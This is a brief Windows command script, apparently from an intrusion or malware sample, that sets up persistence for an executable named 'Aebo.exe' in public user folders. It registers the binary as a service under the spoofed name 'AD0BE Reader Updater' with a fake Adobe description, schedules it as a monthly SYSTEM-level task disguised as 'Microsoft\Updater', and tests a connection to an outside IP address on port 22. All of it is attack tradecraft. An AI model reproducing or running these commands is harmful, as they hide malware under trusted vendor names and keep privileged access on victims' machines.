#C:\Users\Public\Desktop\Aebo.exe
#C:\Users\Public\Music\Aebo.exe
sc.exe create "AD0BE Reader Updater" binPath= "C:\Users\Public\Music\Aebo.exe"
sc.exe description "AD0BE Reader Updater" "Adobe Reader Updater keeps your Adobe software up to date."
SCHTASKS /CREATE /SC MONTHLY /D 15 /TN "Microsoft\Updater" /TR "C:\Users\Public\Music\Aebo.exe" /ST 23:59 /ru "SYSTEM"
Test-NetConnection 51.38.234.206 -Port 22



